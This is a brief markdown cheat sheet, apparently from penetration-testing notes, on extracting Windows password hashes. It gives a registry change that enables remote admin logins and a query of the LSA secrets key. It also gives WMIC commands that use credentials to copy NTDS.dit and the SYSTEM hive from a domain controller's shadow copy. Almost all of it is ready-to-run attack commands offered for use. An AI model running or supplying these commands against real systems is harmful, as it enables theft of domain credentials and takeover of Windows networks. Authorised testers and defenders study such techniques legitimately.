# Getting local hashes

## Enable remote admin login

```
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /V LocalAccountTokenFilterPolicy /T REG_DWORD /F /D 1
```

## Secrets

```
reg query HKLM\Security\Policy\Secrets
```

## WMIC

Note, remove creds to run locally.

```
wmic /node:dc /user:leon /password:password1 process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit 2>&1"

wmic /node:dc /user:domain\leon /password:pentest! process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM\ C:\temp\SYSTEM.hive 2>&1"

wmic process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit 2>&1"
```
